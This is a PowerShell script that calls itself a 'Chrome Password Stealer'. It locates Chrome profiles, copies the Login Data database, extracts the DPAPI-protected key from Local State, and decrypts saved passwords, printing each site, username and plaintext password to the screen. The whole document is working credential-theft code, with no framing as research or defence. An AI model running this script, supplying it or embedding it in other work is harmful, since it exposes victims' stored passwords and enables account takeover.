# BARE MINIMUM Chrome Password Stealer - Visible, No Auto-Close

Write-Host "=== Chrome Password Extractor ===" -ForegroundColor Cyan
Write-Host ""

# Find Chrome database - check all possible profile locations
Write-Host "Searching for Chrome profiles..." -ForegroundColor Yellow

$chromeUserData = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data"

if (-not (Test-Path $chromeUserData)) {
    Write-Host "ERROR: Chrome User Data folder not found!" -ForegroundColor Red
    Write-Host "Path checked: $chromeUserData"
    Read-Host "Press Enter to exit"
    exit
}

# List all profiles
$profiles = Get-ChildItem $chromeUserData -Directory | Where-Object { $_.Name -match "^(Default|Profile \d+)$" }

Write-Host "Found $($profiles.Count) profile(s):" -ForegroundColor Green
foreach ($profile in $profiles) {
    Write-Host "  - $($profile.Name)"
}

# Find Login Data in any profile
$dbPath = $null

foreach ($profile in $profiles) {
    $testPath = Join-Path $profile.FullName "Login Data"
    if (Test-Path $testPath) {
        $dbPath = $testPath
        Write-Host "`nUsing profile: $($profile.Name)" -ForegroundColor Green
        break
    }
}

if (-not $dbPath) {
    Write-Host "`nERROR: No 'Login Data' file found in any profile!" -ForegroundColor Red
    Write-Host "`nChecked these locations:"
    foreach ($profile in $profiles) {
        Write-Host "  - $($profile.FullName)\Login Data"
    }
    Read-Host "Press Enter to exit"
    exit
}

Write-Host "Database found: $dbPath" -ForegroundColor Green

# Try to copy it
$tempDb = "$env:TEMP\chrome_copy.db"

Write-Host ""
Write-Host "Copying database..." -ForegroundColor Yellow

try {
    Copy-Item $dbPath $tempDb -Force
    Write-Host "Copy successful!" -ForegroundColor Green
} catch {
    Write-Host "ERROR: Cannot copy - Chrome might be running!" -ForegroundColor Red
    Write-Host "Error: $($_.Exception.Message)"
    Read-Host "Press Enter to exit"
    exit
}

# Install PSSQLite if needed
Write-Host ""
Write-Host "Checking PSSQLite module..." -ForegroundColor Yellow

if (-not (Get-Module -ListAvailable -Name PSSQLite)) {
    Write-Host "Installing PSSQLite..." -ForegroundColor Yellow
    Install-Module PSSQLite -Force -Scope CurrentUser -SkipPublisherCheck
}

Import-Module PSSQLite
Write-Host "PSSQLite loaded!" -ForegroundColor Green

# Query database
Write-Host ""
Write-Host "Querying database..." -ForegroundColor Yellow

$query = "SELECT origin_url, username_value, password_value FROM logins LIMIT 10"

try {
    $results = Invoke-SqliteQuery -DataSource $tempDb -Query $query
    Write-Host "Found $($results.Count) entries!" -ForegroundColor Green
} catch {
    Write-Host "ERROR: Query failed!" -ForegroundColor Red
    Write-Host "Error: $($_.Exception.Message)"
    Remove-Item $tempDb -Force
    Read-Host "Press Enter to exit"
    exit
}

# Get encryption key
Write-Host ""
Write-Host "Getting encryption key..." -ForegroundColor Yellow

$localStatePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State"

if (-not (Test-Path $localStatePath)) {
    Write-Host "ERROR: Local State not found!" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit
}

Add-Type -AssemblyName System.Security

$localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
$encryptedKeyB64 = $localState.os_crypt.encrypted_key
$encryptedKey = [Convert]::FromBase64String($encryptedKeyB64)
$encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]

$key = [Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, 'CurrentUser')

Write-Host "Encryption key obtained! Length: $($key.Length) bytes" -ForegroundColor Green

# Try to decrypt passwords
Write-Host ""
Write-Host "Decrypting passwords..." -ForegroundColor Yellow
Write-Host ""

$decrypted = 0

foreach ($row in $results) {
    $url = $row.origin_url
    $username = $row.username_value
    $encPass = [byte[]]$row.password_value
    
    if (-not $encPass -or $encPass.Length -eq 0) {
        continue
    }
    
    Write-Host "URL: $url" -ForegroundColor Cyan
    Write-Host "  Username: $username"
    Write-Host "  Encrypted length: $($encPass.Length) bytes"
    Write-Host "  First 3 bytes: $($encPass[0]), $($encPass[1]), $($encPass[2])"
    
    try {
        # Check if v10/v11 (starts with 'v')
        if ($encPass[0] -eq 118) {
            Write-Host "  Encryption: AES-GCM (v10+)" -ForegroundColor Yellow
            
            $nonce = $encPass[3..14]
            $ciphertext = $encPass[15..($encPass.Length - 17)]
            $tag = $encPass[($encPass.Length - 16)..($encPass.Length - 1)]
            
            $aes = [Security.Cryptography.AesGcm]::new($key)
            $plaintext = New-Object byte[] $ciphertext.Length
            
            $aes.Decrypt($nonce, $ciphertext, $tag, $plaintext)
            
            $password = [Text.Encoding]::UTF8.GetString($plaintext)
            
            Write-Host "  Password: $password" -ForegroundColor Green
            $decrypted++
        } else {
            Write-Host "  Encryption: DPAPI (old)" -ForegroundColor Yellow
            
            $decryptedBytes = [Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, 'CurrentUser')
            $password = [Text.Encoding]::UTF8.GetString($decryptedBytes)
            
            Write-Host "  Password: $password" -ForegroundColor Green
            $decrypted++
        }
    } catch {
        Write-Host "  FAILED: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    Write-Host ""
}

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Successfully decrypted: $decrypted passwords" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan

# Cleanup
Remove-Item $tempDb -Force

Write-Host ""
Read-Host "Press Enter to exit"
